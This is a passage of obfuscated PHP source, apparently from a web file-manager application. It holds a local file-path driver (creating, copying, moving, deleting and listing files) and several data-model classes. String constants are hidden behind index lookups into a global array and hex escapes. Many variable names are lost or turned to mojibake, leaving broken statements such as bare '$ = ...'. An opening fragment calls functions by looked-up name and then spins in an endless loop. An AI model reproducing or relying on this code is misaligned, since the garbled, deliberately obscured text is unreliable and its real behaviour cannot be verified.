$_SERVER[][12]) { $exit = $_SERVER[][13]; $exit(); } $_act = $_SERVER[][14]; $_act($_SERVER[$_SERVER[][9]] . $_SERVER[][10]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[][431]); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($) { if (substr($, 0, 2) == $_SERVER[][1394]) { $ = BASIC_PATH . substr($, 2); } return $; } public function iconvApp($) { $⁄Ø =& $_SERVER[]; global $config; return $this->iconvTo($, $config[$⁄Ø[1392]], $config[$⁄Ø[1391]]); } public function iconvSystem($) { $ =& $_SERVER[]; global $config; return $this->iconvTo($, $config[$[1391]], $config[$[1392]]); } public function getPathOuter($) { $ Ç =& $_SERVER[]; $ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($, 0, 2) == $ Ç[1394]) { $ = BASIC_PATH . substr($, 2); } if (substr($, 0, 2) == $ Ç[1394]) { $ = BASIC_PATH . substr($, 2); } $ = KodIO::clear($); $ = KodIO::clear($); $ = substr($, strlen($)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $ Ç[18] . ltrim($, $ Ç[18]); } public function mkfile($’∞, $ = '', $Ÿµ = REPEAT_RENAME) { $’∞ = $this->iconvSystem($’∞); @touch($’∞); if ($) { file_put_contents($’∞, $); } @chmod($’∞, $this->pathAuth); return is_file($’∞) ? $this->getPathOuter($’∞) : !1; } public function mkdir($∆±, $ = REPEAT_SKIP) { $∆± = $this->iconvSystem($∆±); if (is_dir($∆±)) { return $this->getPathOuter($∆±); } @mkdir($∆±, $this->pathAuth, !0); @chmod($∆±, $this->pathAuth); return is_dir($∆±) ? $this->getPathOuter($∆±) : !1; } public function copyFile($ƒü, $) { $this->mkdir($this->pathFather($)); $ƒü = $this->iconvSystem($ƒü); $ = $this->iconvSystem($); $ = copy_64($ƒü, $); @chmod($, $this->pathAuth); return $ ? $this->getPathOuter($) : !1; } public function moveFile($œñ, $∆ï“û) { $this->mkdir($this->pathFather($∆ï“û)); $œñ = $this->iconvSystem($œñ); $∆ï“û = $this->iconvSystem($∆ï“û); $ = intval(@rename($œñ, $∆ï“û)); if (!$) { if ($ = intval(@copy_64($œñ, $∆ï“û))) { @unlink($œñ); } } @chmod($∆ï“û, $this->pathAuth); return $ ? $this->getPathOuter($∆ï“û) : !1; } public function movePath($, $Õò, $“â = false) { $–® =& $_SERVER[]; $ = $this->iconvSystem($); $Õò = $this->iconvSystem($Õò); $Àü = rtrim($Õò, $–®[18]) . $–®[18] . ($“â ? $“â : get_path_this($)); if (file_exists($Àü)) { return !1; } $Ãû = intval(@rename($, $Àü)); $Ãû = file_exists($Àü); return $Ãû ? $this->getPathOuter($Àü) : !1; } public function delFile($Ê±Ñ) { $Ê±Ñ = $this->iconvSystem($Ê±Ñ); if (!@unlink($Ê±Ñ)) { @chmod($Ê±Ñ, $this->pathAuth); if (!@unlink($Ê±Ñ)) { return !1; } } else { return !0; } } public function delFolder($⁄î) { $Œã =& $_SERVER[]; $⁄î = $this->iconvSystem($⁄î); if (!is_dir($⁄î)) { return !0; } if (!($«É = opendir($⁄î))) { return !1; } while (($≈Ö“ï = readdir($«É)) !== !1) { if ($≈Ö“ï == $Œã[20] || $≈Ö“ï == $Œã[1319]) { continue; } $ÈØã…∏ = $⁄î . $Œã[18] . $≈Ö“ï; if (is_file($ÈØã…∏) || is_link($ÈØã…∏)) { if (!unlink($ÈØã…∏)) { chmod($ÈØã…∏, $this->pathAuth); if (!unlink($ÈØã…∏)) { return !1; } } } else { if (is_dir($ÈØã…∏)) { chmod($ÈØã…∏, $this->pathAuth); $ÈØã…∏ = $this->iconvApp($ÈØã…∏); if (!$this->delFolder($ÈØã…∏)) { return !1; } } } } closedir($«É); return rmdir($⁄î); } public function rename($ƒë, $) { $ =& $_SERVER[]; $ = $this->fileNameAuto($this->pathFather($ƒë), $); $ = $this->iconvSystem($); $ƒë = $this->iconvSystem($ƒë); $–™ = $this->pathFather($ƒë); $⁄æ = rtrim($–™, $[18]) . $[18] . $; $’´ = @rename($ƒë, $⁄æ); $⁄æ = $this->iconvApp($⁄æ); return $’´ ? $this->getPathOuter($⁄æ) : !1; } public function size($≈≤) { $≈≤ = $this->iconvSystem($≈≤); return filesize_64($≈≤); } public function info($) { $ = $this->iconvSystem($); if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } protected function infoChildren($, &$√â, $Òéé¶ = true) { $‘ö =& $_SERVER[]; check_abort_echo(); $ = rtrim($, $‘ö[18]) . $‘ö[18]; if ($Òéé¶) { $ = $this->iconvSystem($); } if (!($·ßÉ = @opendir($))) { return; } while (($œ• = readdir($·ßÉ)) !== !1) { if ($œ• == $‘ö[20] || $œ• == $‘ö[1319]) { continue; } $·ÑÖ = $ . $œ•; if (is_file($·ÑÖ) || is_link($·ÑÖ)) { $√â[$‘ö[87]]++; $√â[$‘ö[86]] += filesize_64($·ÑÖ); } else { if (is_dir($·ÑÖ)) { $√â[$‘ö[88]]++; $this->infoChildren($·ÑÖ, $√â, !1); } } } closedir($·ßÉ); } private function folderInfo($, $‚∞æ = false) { $ =& $_SERVER[]; $ = rtrim($, $[18]) . $[18]; $Àå = $this->iconvApp($this->pathThis($)); if ($‚∞æ) { return array($[42] => $Àå, $[94] => $this->getPathOuter($), $[43] => $[85]); } $≈¶⁄í = array($[42] => $Àå, $[94] => $this->getPathOuter($), $[43] => $[85], $[225] => @filectime($), $[95] => @filemtime($), $[1403] => @fileatime($), $[1404] => is_readable($), $[1405] => is_writable($), $[1406] => get_mode($)); return $≈¶⁄í; } private function fileInfo($, $”± = false) { $»µ =& $_SERVER[]; $ﬂΩÀé = $this->iconvApp($this->pathThis($)); if ($”±) { return array($»µ[42] => $ﬂΩÀé, $»µ[94] => $this->getPathOuter($), $»µ[43] => $»µ[224], $»µ[86] => $this->size($), $»µ[185] => $this->ext($ﬂΩÀé)); } $¬º = array($»µ[42] => $ﬂΩÀé, $»µ[94] => $this->getPathOuter($), $»µ[43] => $»µ[224], $»µ[225] => @filectime($), $»µ[95] => @filemtime($), $»µ[1403] => @fileatime($), $»µ[86] => $this->size($), $»µ[185] => $this->ext($ﬂΩÀé), $»µ[1404] => is_readable($), $»µ[1405] => is_writable($), $»µ[1406] => get_mode($)); return $¬º; } public function exist($÷û⁄ì) { $÷û⁄ì = $this->iconvSystem($÷û⁄ì); return @file_exists($÷û⁄ì); } public function isFile($÷í€ßﬂ≥) { $÷í€ßﬂ≥ = $this->iconvSystem($÷í€ßﬂ≥); return @is_file($÷í€ßﬂ≥); } public function isFolder($¬û≈ú) { $¬û≈ú = $this->iconvSystem($¬û≈ú); return @is_dir($¬û≈ú); } public function listPath($“Å, $ = false) { $∆Ø =& $_SERVER[]; $“Å = $this->iconvSystem($“Å); $“Å = rtrim($“Å, $∆Ø[18]) . $∆Ø[18]; $ = array($∆Ø[92] => array(), $∆Ø[93] => array()); if (!($›≥ = @opendir($“Å))) { return $; } while (($ÓóÉ = readdir($›≥)) !== !1) { if ($ÓóÉ == $∆Ø[20] || $ÓóÉ == $∆Ø[1319]) { continue; } $≈Ñ = $“Å . $ÓóÉ; if (is_file($≈Ñ)) { $[$∆Ø[93]][] = $this->fileInfo($≈Ñ, $); } else { $[$∆Ø[92]][] = $this->folderInfo($≈Ñ, $); } } closedir($›≥); return $; } public function listAll($∆Ä∆∞, &$Ïº© = array()) { $ =& $_SERVER[]; $∆Ä∆∞ = $this->iconvSystem($∆Ä∆∞); $∆Ä∆∞ = rtrim($∆Ä∆∞, $[18]) . $[18]; if (!($”à = @opendir($∆Ä∆∞))) { return $Ïº©; } while (($ = readdir($”à)) !== !1) { if ($ == $[20] || $ == $[1319]) { continue; } $›£ = $∆Ä∆∞ . $; $Ÿº = is_dir($›£) && !is_link($›£) ? 1 : 0; $›£ = $Ÿº ? $›£ . $[18] : $›£; $Ïº©[] = array($[94] => $›£, $[85] => $Ÿº, $[95] => intval(@filemtime($›£)), $[86] => $Ÿº ? 0 : intval($this->size($›£))); if ($Ÿº) { $this->listAll($›£, $Ïº©); } } closedir($”à); return $Ïº©; } public function has($, $ = false, $ = true) { $◊ª›® =& $_SERVER[]; $ = $this->iconvSystem($); $ = rtrim($, $◊ª›®[18]) . $◊ª›®[18]; if (!($ = @opendir($))) { return !1; } $·òº = 0; $ = 0; $ = 0; while (($·Öé = readdir($)) !== !1) { if ($·Öé == $◊ª›®[20] || $·Öé == $◊ª›®[1319]) { continue; } $ = $ . $·Öé; if ($) { $++; if (@is_file($)) { $·òº++; } else { $++; } if ($ > 10000) { break; } continue; } if ($) { if (@is_file($)) { return !0; } } else { if (@is_dir($ . $◊ª›®[18])) { return !0; } } } closedir($); if ($) { return array($◊ª›®[233] => $·òº, $◊ª›®[234] => $); } return !1; } public function hashSimple($’û“™ÿò) { $Íì£ =& $_SERVER[]; if (!$’û“™ÿò) { return md5($Íì£[22]); } $’û“™ÿò = $this->iconvSystem($’û“™ÿò); $ ê = $this->size($’û“™ÿò); $ÎÄî = 200; $ = 50; if ($ ê <= $ÎÄî * $) { return $this->hashMd5($’û“™ÿò) . $ ê; } $ƒ±◊¥ = $Íì£[22]; $ = intval($ ê / $); $Ã¶ = fopen($’û“™ÿò, $Íì£[1407]); if (!$Ã¶) { return $ƒ±◊¥; } for ($ = 0; $ < $; $++) { fseek_64($Ã¶, $ * $); $ƒ±◊¥ .= fread($Ã¶, $ÎÄî); } fseek_64($Ã¶, $ ê - $ÎÄî); $ƒ±◊¥ .= fread($Ã¶, $ÎÄî); fclose($Ã¶); return md5($ƒ±◊¥) . $ ê; } public function getContent($Œú) { $Œú = $this->iconvSystem($Œú); return file_get_contents($Œú); } public function setContent($Õ∫, $ = '') { $Õ∫ = $this->iconvSystem($Õ∫); $ = @file_put_contents($Õ∫, $, LOCK_EX); clearstatcache(); @chmod($Õ∫, $this->pathAuth); return $ === !1 ? !1 : !0; } public function fileSubstr($”ü, $ = 0, $ = false) { $ =& $_SERVER[]; $”ü = $this->iconvSystem($”ü); if ($ === !1) { $ = $this->size($”ü); } if ($ <= 0) { return $[22]; } $—ñ–ã = fopen($”ü, $[1407]); if (!$—ñ–ã) { return !1; } fseek_64($—ñ–ã, $); $œô = fread($—ñ–ã, $); fclose($—ñ–ã); return $œô; } public function upload($—à, $Ÿí, $›ª = false, $‚Ñô = REPEAT_REPLACE) { if ($›ª) { return $this->moveFile($Ÿí, $—à); } return $this->copyFile($Ÿí, $—à); } public function setModifyTime($⁄ãÿâ, $ = '') { @touch($⁄ãÿâ, intval($)); } public function download($, $) { return $this->iconvSystem($); } } goto aﬁç; cÏØ•: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\x6d\117\x70\164\151\x6f\x6e"; public $field = array(); public function listData($–è = false, $ = "\x6d\x6f\x64\x69\x66\x79\124\151\x6d\x65", $œÜ = false) { $ = Model($this->modelType)->get(!1, $this->optionType, !0); $√© = array_values($); if ($√© && $√©[0] && !is_array($√©[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$) { return $–è ? null : array(); } if (!$–è) { $ = array_filter(array_values($)); return array_sort_by($, $, $œÜ); } return $[$_SERVER[][449] . $–è]; } public function insert($ÿãŸò) { $–© =& $_SERVER[]; $ÿãŸò = array_field_key($ÿãŸò, $this->field); $Ÿµ = Model($this->modelType)->get($–©[450], $this->optionType . $–©[451]); $Ÿµ = $Ÿµ ? $Ÿµ : 0; $ÿãŸò[$–©[452]] = ++$Ÿµ; $ÿãŸò[$–©[225]] = time(); $ÿãŸò[$–©[95]] = time(); Model($this->modelType)->set($–©[450], $Ÿµ, $this->optionType . $–©[451]); Model($this->modelType)->set($–©[449] . $Ÿµ, $ÿãŸò, $this->optionType); return $Ÿµ; } public function update($, $‘£) { $ =& $_SERVER[]; $‘£ = array_field_key($‘£, $this->field); $∆ä = $this->listData($); if (!$∆ä || !$) { return !1; } $‘£ = array_merge($∆ä, $‘£); $‘£[$[95]] = time(); return Model($this->modelType)->set($[449] . $, $‘£, $this->optionType); } public function remove($) { if (!$) { return !1; } return Model($this->modelType)->remove($_SERVER[][449] . $, $this->optionType); } public function clear() { $◊àÀÅ =& $_SERVER[]; Model($this->modelType)->remove($◊àÀÅ[450], $this->optionType . $◊àÀÅ[451]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ﬁö, $ÁØü) { if (!$ÁØü) { return !1; } $ = $this->listData(); $ = array_to_keyvalue($, $ﬁö); return isset($[$ÁØü]) ? $[$ÁØü] : !1; } public function findByName($) { return $this->findByKey($_SERVER[][42], $); } protected function resetData($) { $ =& $_SERVER[]; $ = is_array($) ? $ : array(); $ = array(); for ($…± = 0; $…± < count($); $…±++) { $[$[449] . $[$…±][$[452]]] = $[$…±]; } return Model($this->modelType)->set($, !1, $this->optionType); } private function getAutoName($) { $⁄§ = array_to_keyvalue($this->listData(), $_SERVER[][42]); if (!$⁄§ || !isset($⁄§[$])) { return $; } for ($∆î = 1; $∆î < count($⁄§); $∆î++) { $ = $ . "\x28{$∆î}\x29"; if (!isset($⁄§[$])) { return $; } } return $; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ = false, $’¢Á≤∏ = '', $⁄ß = false) { $Œ∑Ãï =& $_SERVER[]; $Î∏ä = $this->cacheGet($’¢Á≤∏); $œÇ = $this->optionDefault($’¢Á≤∏); $œÇ = is_array($œÇ) ? $œÇ : array(); if (is_array($Î∏ä)) { $Î∏ä = array_merge($œÇ, $Î∏ä); return $ ? isset($Î∏ä[$]) ? $Î∏ä[$] : null : $Î∏ä; } $Ó∞ù = $this->filterWhere(array($Œ∑Ãï[43] => $’¢Á≤∏)); $Î∏ä = $this->where($Ó∞ù)->select(); $Î∏ä = array_to_keyvalue($Î∏ä, $Œ∑Ãï[104], $Œ∑Ãï[427]); foreach ($Î∏ä as $∆π => $) { if ($⁄ß || in_array($∆π, $this->jsonField)) { $Î∏ä[$∆π] = json_decode($, !0); } } $this->cacheSet($’¢Á≤∏, $Î∏ä); $Î∏ä = array_merge($œÇ, $Î∏ä); return $ ? $Î∏ä[$] : $Î∏ä; } public function set($, $ = false, $ = '') { $·çø =& $_SERVER[]; $this->cacheRemove($); $ ú = array(); $ÕñÕ§ = is_array($) ? $ : array($ => $); foreach ($ÕñÕ§ as $Ÿ≠ => $∆Æ) { if (is_array($∆Æ)) { $∆Æ = json_encode_force($∆Æ); } $this->checkLength($∆Æ, !1, $this->tableName . $·çø[4] . $); $∆Æ = self::textEncode($∆Æ); $ÕñÕ§ = array($·çø[43] => $, $·çø[104] => $Ÿ≠, $·çø[427] => $∆Æ); $ ú[] = $this->filterWhere($ÕñÕ§); } if (!$ ú) { return !0; } $ = $this->cacheKey($·çø[453]); CacheLock::lock($); $ = $this->addAll($ ú, array(), !0); CacheLock::unlock($); return $; } protected function optionDefault($ = '') { return !1; } public function setDeep($, $√´‚¨∞ = false, $ = '') { $Ãó = explode($_SERVER[][20], $); $ = $this->get(); array_set_value($, $, $√´‚¨∞); $this->set($Ãó[0], $[$Ãó[0]], $); } public function remove($, $ƒë = '') { $ÁÖó =& $_SERVER[]; $this->cacheRemove($ƒë); $Ò§ú≥ = $this->filterWhere(array($ÁÖó[104] => $, $ÁÖó[43] => $ƒë)); if (is_null($)) { unset($Ò§ú≥[$ÁÖó[104]]); } return $this->where($Ò§ú≥)->delete(); } public function cacheSet($ﬂå, $ = false) { return Cache::set($this->cacheKey($ﬂå), $); } public function cacheGet($) { return Cache::get($this->cacheKey($)); } public function cacheRemove($‘¥) { return Cache::remove($this->cacheKey($‘¥)); } protected function filterWhere($÷ª) { return $÷ª; } protected function cacheKey($) { return $; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\x6d\x65" => "\x69\157\x5f\x73\157\x75\x72\x63\x65\x5f\x6d\x65\x74\141", "\x6d\x65\x74\x61\106\151\145\x6c\144" => "\x73\x6f\165\162\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\163\x65\x72\x74", "\x66\x75\x6e\x63\164\151\157\156"), array("\143\x72\145\x61\x74\145\x54\151\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\164", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x76\x69\145\167\124\x69\155\x65", "\x74\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($≈∫) { return $this->listSource(array($_SERVER[][454] => $≈∫)); } public function typeName($ﬁ≤œí) { static $ ú›• = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ ú›•[$ﬁ≤œí . $_SERVER[][22]]; } public function sourceListInfo($«¨, $ = false) { $ =& $_SERVER[]; $«¨ = $«¨ ? $«¨ : array(); $«¨ = array_filter(array_unique($«¨)); if (!$«¨) { return array(); } $ = $this->where(array($[191] => array($[17], $«¨)))->select(); $this->_listDataApply($, $); return array_to_keyvalue($, $[191]); } public function pathInfoFilter(&$∆ø) { $ =& $_SERVER[]; static $ = false; static $Ÿ£ = false; static $Ÿù = false; if (!$) { $ ∏ = $[455]; $ ∏ .= $[456]; $ ∏ .= $[457]; $Ï≤¨ = $[458]; $Ÿ£ = explode($[60], $Ï≤¨); $ = explode($[60], $ ∏); $Ÿ£ = array(); foreach ($ as $Ÿ∂) { if (in_array($Ÿ∂, $Ÿ£)) { continue; } $Ÿ£[] = $Ÿ∂; } $Ÿù = explode($[60], $[459]); } foreach ($Ÿù as $«ÆﬁÅ) { if (isset($∆ø[$«ÆﬁÅ])) { $∆ø[$«ÆﬁÅ] = intval($∆ø[$«ÆﬁÅ]); } } $∆ø[$[94]] = $[460] . $∆ø[$[191]] . $[461]; $∆ø[$[43]] = $∆ø[$[462]] == 1 ? $[85] : $[224]; $∆ø[$[188]] = $this->typeName($∆ø[$[188]]); if ($∆ø[$[462]] != 1) { $∆ø[$[185]] = $∆ø[$[463]]; unset($∆ø[$[463]]); } $‡ºû = $; if (isset($∆ø[$[464]]) && $∆ø[$[464]][$[465]] == -1) { $‡ºû = $Ÿ£; } $∆ø = array_field_key($∆ø, $‡ºû); return $∆ø; } public function listUserFav() { $—ø =& $_SERVER[]; $«à = Model($—ø[466])->listData(); $«ü = array_filter_by_field($«à, $—ø[43], $—ø[467]); $«ü = array_to_keyvalue($«ü, $—ø[22], $—ø[94]); if ($«ü) { $Óïï√ä = $this->listSource(array($—ø[468] => array($—ø[469], $«ü))); } $Óïï√ä = array_to_keyvalue($Óïï√ä[$—ø[422]], $—ø[191]); foreach ($«à as &$€≠) { $€≠ = array($—ø[470] => $€≠[$—ø[452]], $—ø[471] => $€≠[$—ø[42]], $—ø[472] => $€≠[$—ø[94]], $—ø[473] => $€≠[$—ø[43]], $—ø[474] => $€≠[$—ø[225]], $—ø[475] => $€≠[$—ø[95]]); if ($€≠[$—ø[43]] == $—ø[467] && $Óïï√ä[$€≠[$—ø[94]]]) { $€≠[$—ø[97]] = $Óïï√ä[$€≠[$—ø[94]]]; } } unset($€≠); return $«à; } public function listUserTag($ƒô’æ) { $—º =& $_SERVER[]; if ($ƒô’æ && !is_array($ƒô’æ)) { $ƒô’æ = array($ƒô’æ); } $ŒôŸé = Model($—º[476])->listData(); $„êÜ = array(); $ﬂ†’≤ = array(); foreach ($ŒôŸé as $) { $”• = $[$—º[94]]; if (!$”•) { continue; } if (!isset($ﬂ†’≤[$”•])) { $ﬂ†’≤[$”•] = array(); } $ﬂ†’≤[$”•][] = $[$—º[477]]; $„êÜ[$[$—º[94]]] = $; } $‹ô = array(); $√Ñ = array(); $ = array(); foreach ($ﬂ†’≤ as $∆É => $—º) { $∆´ = !0; if (!$ƒô’æ) { $‹ô[] = $∆É; continue; } foreach ($ƒô’æ as $¬õÓãª) { if (!in_array($¬õÓãª, $—º)) { $∆´ = !1; break; } } if (!$∆´) { continue; } if (!is_numeric($∆É)) { $ = $„êÜ[$∆É]; $ = array($—º[42] => $[$—º[42]], $—º[94] => $[$—º[94]], $—º[43] => $[$—º[43]], $—º[97] => array($—º[478] => 1), $—º[226] => !0); if ($[$—º[43]] == $—º[224]) { $[] = $; } if ($[$—º[43]] == $—º[85]) { $√Ñ[] = $; } continue; } $‹ô[] = $∆É; } if ($‹ô) { $ = $this->listSource(array($—º[468] => array($—º[469], $‹ô))); } $ = $ ? $ : array($—º[92] => array(), $—º[93] => array()); $[$—º[92]] = array_merge($[$—º[92]], $√Ñ); $[$—º[93]] = array_merge($[$—º[93]], $); if (isset($[$—º[419]]) && count($‹ô) == $[$—º[419]][$—º[420]]) { return $; } $ = array(); $ = array_to_keyvalue($[$—º[92]], $—º[22], $—º[191]); $ = array_to_keyvalue($[$—º[93]], $—º[22], $—º[191]); $÷£ = array_merge($, $); foreach ($‹ô as $”•) { if (!in_array($”•, $÷£)) { $[] = $”•; } } if ($) { Model($—º[479])->removeBySource($); } return $; } public function listUserRecycle() { $ =& $_SERVER[]; $ = Model($[480])->listData(); if (!$) { return array(); } $—µ◊¶ = array($[468] => array($[469], $), $[481] => 1); return $this->listSource($—µ◊¶); } public function listSource($, $·ïë = 3000, $Ôáü = false) { $«ì√Ø =& $_SERVER[]; if (!isset($[$«ì√Ø[482]])) { $[$«ì√Ø[482]] = 0; } if (isset($[$«ì√Ø[190]]) && $[$«ì√Ø[190]] == $«ì√Ø[222]) { $[$«ì√Ø[463]] = array($«ì√Ø[384], $«ì√Ø[483]); } $”ç„äπ = $«ì√Ø[484]; $≈ö = $this->field($”ç„äπ)->_makeOrder()->where($)->selectPage($·ïë); $this->_listPageCheck($≈ö, $”ç„äπ, $); $this->_listDataApply($≈ö[$«ì√Ø[422]], $Ôáü); $this->_listMake($≈ö); return $≈ö; } private function _listPageCheck(&$—Ñ, $ é, $) { $‰óú =& $_SERVER[]; if (!is_array($—Ñ[$‰óú[419]])) { return; } $ = $—Ñ[$‰óú[419]]; if ($[$‰óú[421]] <= 1) { return; } if ($[$‰óú[420]] >= 100000) { return; } if (Model($‰óú[485])->get($‰óú[486]) != $‰óú[487]) { return; } $ é = str_replace(array($‰óú[63], $‰óú[395], $‰óú[11]), $‰óú[22], $ é); $ é = $‰óú[488] . str_replace($‰óú[60], $‰óú[489], $ é) . $‰óú[490]; $ = $‰óú[491]; $ = $ . $‰óú[492]; $ = $[$‰óú[416]] * ($[$‰óú[406]] - 1) . $‰óú[60] . $[$‰óú[416]]; $ = $this->_makeOrder(!0); $ŸÅ = $‰óú[488] . str_replace($‰óú[60], $‰óú[489], $[0]); if (strpos($ŸÅ, $‰óú[493])) { $ŸÅ = str_replace($‰óú[493], $‰óú[494], $ŸÅ); } else { $ŸÅ .= $‰óú[495] . $[1]; } $√® = array(); foreach ($ as $ﬁã => $€ï) { $√®[$‰óú[488] . $ﬁã] = $€ï; } $this->alias($‰óú[496])->field($ é)->limit($)->order($ŸÅ); $ = $this->join($)->where($√®)->select(); if ($) { $—Ñ[$‰óú[422]] = $; } } protected function _makeOrder($√ò = false) { $Ã• =& $_SERVER[]; $€ó = Model($Ã•[497])->get($Ã•[498]); $Œ§ = Model($Ã•[497])->get($Ã•[499]); $ = array($Ã•[500] => $Ã•[501], $Ã•[502] => $Ã•[503]); $ﬂü«° = array($Ã•[42] => $Ã•[42], $Ã•[86] => $Ã•[86], $Ã•[185] => $Ã•[463], $Ã•[504] => $Ã•[504], $Ã•[505] => $Ã•[506], $Ã•[225] => $Ã•[225], $Ã•[95] => $Ã•[95]); $‹´ = Input::get($Ã•[507], $Ã•[17], $€ó, array_keys($ﬂü«°)); $ = Input::get($Ã•[508], $Ã•[17], $Œ§, array_keys($)); if (!in_array($‹´, array_keys($ﬂü«°))) { $‹´ = $Ã•[42]; } if (!in_array($, array_keys($))) { $‹´ = $Ã•[500]; } if ($‹´ == $Ã•[42]) { } $ = $Ã•[509] . $ﬂü«°[$‹´] . $Ã•[63] . $[$]; $ = rtrim(trim($), $Ã•[60]); if ($√ò) { return array($, $[$]); } return $this->order($); } protected function _listDataApplyItem($’â, $ = false) { $Èßô = array($’â); $this->_listDataApply($Èßô, $); return $Èßô[0]; } protected function _listDataApply(&$ŸÉ, $ = false) { $Íó≤ =& $_SERVER[]; if (!$ŸÉ) { $ŸÉ = array(); return; } $…ï = array_to_keyvalue($ŸÉ, $Íó≤[22], $Íó≤[191]); $…ï = array_unique($…ï); $this->_listSourceCache($ŸÉ); if (!$) { $this->_listAppendMeta($ŸÉ, $…ï); $this->_listAppendFileMeta($ŸÉ, $…ï); $this->_listAppendChildren($ŸÉ, $…ï); } $this->_listAppendPath($ŸÉ); $this->_listAppendAuth($ŸÉ); $this->_listAppendSourceInfo($ŸÉ, $…ï); $this->_listAppendUser($ŸÉ); $this->_listFilterInfo($ŸÉ, $); $this->_listAppendAuthSecret($ŸÉ); } protected function _listSourceCache($) { $ =& $_SERVER[]; foreach ($ as $) { self::$cacheSourceInfo[$[510] . $[$[191]]] = $; } } protected function _listFilterInfo(&$, $À≥ = false) { $ =& $_SERVER[]; foreach ($ as &$—â) { $—â = $this->pathInfoFilter($—â); self::$cachePathInfo[$[511] . intval($À≥) . $[439] . $—â[$[191]]] = $—â; } unset($—â); } protected function _listMake(&$Òßñù) { $ =& $_SERVER[]; $Òßñù[$[92]] = array(); $Òßñù[$[93]] = array(); foreach ($Òßñù[$[422]] as $“¢⁄º) { $ = $“¢⁄º[$[462]] == 1 ? $[92] : $[93]; $Òßñù[$][] = $“¢⁄º; } unset($Òßñù[$[422]]); } protected function _listAppendMeta(&$Ìâ§«≠, $—®) { $–ò =& $_SERVER[]; $ŸªÕ° = array($–ò[468] => array($–ò[469], $—®)); $‘ò√∏ = Model($–ò[512])->field($–ò[513])->where($ŸªÕ°)->select(); if (!$‘ò√∏) { return; } $”ì = array($–ò[514], $–ò[515], $–ò[494]); $ = array(); foreach ($‘ò√∏ as $ ≤) { if (!isset($[$ ≤[$–ò[191]]])) { $[$ ≤[$–ò[191]]] = array(); } if (in_array($ ≤[$–ò[104]], $”ì)) { continue; } $[$ ≤[$–ò[191]]][$ ≤[$–ò[104]]] = $ ≤[$–ò[427]]; } foreach ($Ìâ§«≠ as &$ÔΩç) { $ÔΩç[$–ò[516]] = !1; if (isset($[$ÔΩç[$–ò[191]]])) { $ÔΩç[$–ò[516]] = $[$ÔΩç[$–ò[191]]]; } if ($this->fileIsLock($ÔΩç) && $ÔΩç[$–ò[464]]) { $‰ùÅ ò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÔΩç[$–ò[464]][$–ò[465]] = AuthModel::authDisable($ÔΩç[$–ò[464]][$–ò[465]], $‰ùÅ ò); $ÔΩç[$–ò[464]][$–ò[517]][$–ò[464]] = $ÔΩç[$–ò[464]][$–ò[465]]; } } unset($ÔΩç); } protected function _listAppendFileMeta(&$“¶, $) { $—ñ =& $_SERVER[]; $ = array_to_keyvalue($“¶, $—ñ[22], $—ñ[518]); $ = array_filter(array_unique($)); if (!$) { return; } $ÿÇﬁö = array($—ñ[519] => array($—ñ[469], $)); $ = $—ñ[520]; $Ïèò = Model($—ñ[521])->field($)->where($ÿÇﬁö)->select(); $Ïèò = array_to_keyvalue($Ïèò, $—ñ[518]); $ = Model($—ñ[522])->field($—ñ[523])->where($ÿÇﬁö)->select(); $ = $ ? $ : array(); $Œ™ = array(); foreach ($ as $) { if (!isset($Œ™[$[$—ñ[518]]])) { $Œ™[$[$—ñ[518]]] = array(); } $Œ™[$[$—ñ[518]]][$[$—ñ[104]]] = $[$—ñ[427]]; } foreach ($“¶ as &$—û) { $ÕΩÊÜê = $—û[$—ñ[518]]; if (!$ÕΩÊÜê || !is_array($Ïèò[$ÕΩÊÜê])) { continue; } $ = $Ïèò[$ÕΩÊÜê]; $[$—ñ[86]] = $—û[$—ñ[86]]; $[$—ñ[42]] = $—û[$—ñ[42]]; if (!isset(self::$cacheFileInfo[$—ñ[524] . $ÕΩÊÜê])) { self::$cacheFileInfo[$—ñ[524] . $ÕΩÊÜê] = array_merge(array(), $); } unset($Ïèò[$ÕΩÊÜê][$—ñ[94]]); $›ñ = is_array($Œ™[$ÕΩÊÜê]) ? $Œ™[$ÕΩÊÜê] : array(); $—û[$—ñ[525]] = array_merge($›ñ, $Ïèò[$ÕΩÊÜê]); if (isset($—û[$—ñ[525]][$—ñ[181]])) { $—û[$—ñ[181]] = json_decode($—û[$—ñ[525]][$—ñ[181]], !0); unset($—û[$—ñ[525]][$—ñ[181]]); } } unset($—û); } protected function _listAppendSourceInfo(&$, $) { $ =& $_SERVER[]; $ = Model($[526])->listData(); $Ìí†”é = Model($[476])->listData(); $ƒó = Model($[466])->listData(); $ = Model($[527])->listSimple(); $ﬂÄ = array_to_keyvalue($, $[452]); $‚∑π = array_to_keyvalue_group($Ìí†”é, $[94], $[477]); $ÙÄèè = array_to_keyvalue($ƒó, $[94]); $¬∞ = array_to_keyvalue_group($, $[191]); foreach ($ as &$ÔÉ±) { $ÔÉ±[$[97]] = array($[528] => 0, $[529] => 0, $[530] 